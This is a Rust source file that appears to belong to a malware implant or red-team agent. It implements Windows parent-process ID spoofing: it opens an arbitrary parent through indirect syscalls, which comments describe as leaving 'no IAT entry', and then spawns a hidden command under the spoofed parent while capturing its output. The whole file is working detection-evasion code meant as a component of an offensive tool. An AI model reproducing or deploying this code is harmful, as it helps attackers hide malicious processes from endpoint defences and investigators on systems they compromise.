//! Process creation helper for PPID spoofing.
use anyhow::Result;

#[cfg(all(windows, feature = "ppid-spoofing"))]
pub fn execute_command(
    program: &str,
    args: &[&str],
    capture_output: bool,
) -> Result<std::process::Output> {
    use std::os::windows::ffi::OsStrExt;
    use winapi::um::processthreadsapi::{
        CreateProcessW, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList,
        UpdateProcThreadAttribute, PROCESS_INFORMATION,
    };
    use winapi::um::winbase::{CREATE_NO_WINDOW, EXTENDED_STARTUPINFO_PRESENT, STARTUPINFOEXW};
    use winapi::um::winnt::{HANDLE, PROCESS_CREATE_PROCESS};
    const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;
    use winapi::um::fileapi::ReadFile;
    use winapi::um::namedpipeapi::CreatePipe;
    use winapi::um::winbase::HANDLE_FLAG_INHERIT;
    use winapi::um::winbase::STARTF_USESTDHANDLES;

    let parent_pid =
        crate::process_manager::get_spoof_parent_pid().unwrap_or_else(|| std::process::id());

    unsafe {
        // OpenProcess → NtOpenProcess (indirect syscall, no IAT entry)
        let mut p_handle_raw: usize = 0;
        if parent_pid != std::process::id() {
            let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
            obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
            let mut client_id = [0u64; 2];
            client_id[0] = parent_pid as u64;
            let status = syscall!(
                "NtOpenProcess",
                &mut p_handle_raw as *mut _ as u64,
                PROCESS_CREATE_PROCESS as u64,
                &mut obj_attr as *mut _ as u64,
                client_id.as_mut_ptr() as u64,
            );
            if status.is_err() || status.unwrap() < 0 {
                p_handle_raw = 0;
            }
        }
        let mut p_handle: HANDLE = if p_handle_raw != 0 { p_handle_raw as *mut _ } else { std::ptr::null_mut() };

        let mut size = 0;
        InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut size);
        // InitializeProcThreadAttributeList may leave `size = 0` on failure
        // (e.g. invalid parameters), which would make the subsequent
        // `vec![0u8; 0]` allocation produce a dangling pointer that the second
        // call would then write through.  Fall back to a reasonable default
        // (H-7).
        if size == 0 {
            size = 1024;
        }
        let mut attr_list_buf = vec![0u8; size];
        let attr_list = attr_list_buf.as_mut_ptr() as *mut _;

        let mut si: STARTUPINFOEXW = std::mem::zeroed();
        si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;

        if p_handle.is_null() == false {
            if InitializeProcThreadAttributeList(attr_list, 1, 0, &mut size) != 0 {
                let success = UpdateProcThreadAttribute(
                    attr_list,
                    0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    &mut p_handle as *mut _ as *mut _,
                    std::mem::size_of::<HANDLE>(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                );
                if success != 0 {
                    si.lpAttributeList = attr_list;
                }
            }
        }

        let mut stdout_rd: HANDLE = std::ptr::null_mut();
        let mut stdout_wr: HANDLE = std::ptr::null_mut();

        if capture_output {
            let mut sec_attr: winapi::um::minwinbase::SECURITY_ATTRIBUTES = std::mem::zeroed();
            sec_attr.nLength =
                std::mem::size_of::<winapi::um::minwinbase::SECURITY_ATTRIBUTES>() as u32;
            sec_attr.bInheritHandle = 1; // TRUE

            if CreatePipe(&mut stdout_rd, &mut stdout_wr, &mut sec_attr, 0) != 0 {
                // SetHandleInformation → NtSetInformationObject (indirect syscall, no IAT entry)
                // ObjectHandleFlagInformation = 4: { Inherit, ProtectFromClose }
                #[repr(C)]
                struct ObjHandleFlagInfo {
                    inherit: u8,
                    protect_from_close: u8,
                }
                let flag_info = ObjHandleFlagInfo { inherit: 0, protect_from_close: 0 };
                let _ = syscall!(
                    "NtSetInformationObject",
                    stdout_rd as u64,                            // Handle
                    4u64,                                        // ObjectHandleFlagInformation
                    &flag_info as *const _ as u64,              // Info
                    std::mem::size_of::<ObjHandleFlagInfo>() as u64, // Length
                );
                si.StartupInfo.hStdOutput = stdout_wr;
                si.StartupInfo.hStdError = stdout_wr;
                si.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;
            }
        }

        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        // Quote arguments that contain whitespace or shell-meta characters so
        // the spawned process receives them as a single token (H-7).  The
        // previous bare concatenation broke any argument with a space.
        fn quote_arg(s: &str) -> String {
            if s.is_empty()
                || s.chars()
                    .any(|c| matches!(c, ' ' | '\t' | '"' | '&' | '|' | '<' | '>' | '^'))
            {
                format!("\"{}\"", s.replace('"', "\\\""))
            } else {
                s.to_string()
            }
        }
        let mut cmd_str = String::from(program);
        for a in args {
            cmd_str.push(' ');
            cmd_str.push_str(&quote_arg(a));
        }
        let mut cmd_w: Vec<u16> = std::ffi::OsStr::new(&cmd_str)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        let flags = EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW;
        let success = CreateProcessW(
            std::ptr::null(), // ApplicationName
            cmd_w.as_mut_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            1, // InheritHandles
            flags,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si.StartupInfo,
            &mut pi,
        );

        // Clean up writer handle in parent immediately
        if !stdout_wr.is_null() {
            pe_resolve::close_handle(stdout_wr);
        }

        if !si.lpAttributeList.is_null() {
            DeleteProcThreadAttributeList(si.lpAttributeList);
        }
        if !p_handle.is_null() {
            pe_resolve::close_handle(p_handle);
        }

        if success == 0 {
            if !stdout_rd.is_null() {
                pe_resolve::close_handle(stdout_rd);
            }
            return Err(anyhow::anyhow!(
                "CreateProcessW failed with {}",
                std::io::Error::last_os_error()
            ));
        }

        let mut output_bytes = Vec::new();
        if capture_output && !stdout_rd.is_null() {
            let mut buf = [0u8; 4096];
            loop {
                let mut bytes_read = 0;
                let ok = ReadFile(
                    stdout_rd,
                    buf.as_mut_ptr() as _,
                    buf.len() as u32,
                    &mut bytes_read,
                    std::ptr::null_mut(),
                );
                if ok == 0 || bytes_read == 0 {
                    break;
                }
                output_bytes.extend_from_slice(&buf[..bytes_read as usize]);
            }
            pe_resolve::close_handle(stdout_rd);
        }

        // WaitForSingleObject → NtWaitForSingleObject (indirect syscall, no IAT entry)
        let _ = syscall!(
            "NtWaitForSingleObject",
            pi.hProcess as u64,    // Handle
            0u64,                    // Alertable = FALSE
            std::ptr::null::<u64>() as u64, // Timeout = NULL (infinite)
        );

        // GetExitCodeProcess → NtQueryInformationProcess(ProcessBasicInformation)
        // PROCESS_BASIC_INFORMATION contains ExitStatus as the first field after the NTSTATUS.
        #[repr(C)]
        struct ProcessBasicInformation {
            reserved1: *mut std::ffi::c_void,
            peb_base_address: *mut std::ffi::c_void,
            reserved2: [*mut std::ffi::c_void; 2],
            unique_process_id: usize,
            inherited_from_unique_process_id: usize,
            exit_status: i32,
        }
        let mut pbi: ProcessBasicInformation = std::mem::zeroed();
        let _ = syscall!(
            "NtQueryInformationProcess",
            pi.hProcess as u64,                            // ProcessHandle
            0u64,                                           // ProcessBasicInformation
            &mut pbi as *mut _ as u64,                     // ProcessInformation
            std::mem::size_of::<ProcessBasicInformation>() as u64, // Length
            std::ptr::null_mut::<u64>() as u64,            // ReturnLength
        );
        let exit_code = if pbi.exit_status == 259 { 259u32 } else { pbi.exit_status as u32 };

        let _ = syscall!("NtClose", pi.hThread as u64);
        let _ = syscall!("NtClose", pi.hProcess as u64);

        use std::os::windows::process::ExitStatusExt;
        Ok(std::process::Output {
            status: std::process::ExitStatus::from_raw(exit_code),
            stdout: output_bytes,
            stderr: Vec::new(),
        })
    }
}

// Fallback normal method
#[cfg(any(not(windows), not(feature = "ppid-spoofing")))]
pub fn execute_command(
    program: &str,
    args: &[&str],
    capture_output: bool,
) -> Result<std::process::Output> {
    let mut cmd = std::process::Command::new(program);
    cmd.args(args);
    if capture_output {
        let out = cmd.output()?;
        Ok(out)
    } else {
        let status = cmd.status()?;
        Ok(std::process::Output {
            status,
            stdout: Vec::new(),
            stderr: Vec::new(),
        })
    }
}
